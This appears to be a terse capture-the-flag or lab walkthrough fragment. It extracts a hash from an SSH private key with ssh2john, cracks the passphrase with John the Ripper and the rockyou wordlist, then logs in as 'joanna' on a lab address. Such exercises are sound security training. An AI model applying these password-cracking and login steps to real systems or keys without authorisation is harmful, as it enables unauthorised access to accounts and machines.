Copy the hash into [key]

```
/usr/share/john/ssh2john.py key > hash
```

```
chmod 600 key
```

```
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Password

```
ssh -i key joanna@10.10.10.10
```

Enter Passphrase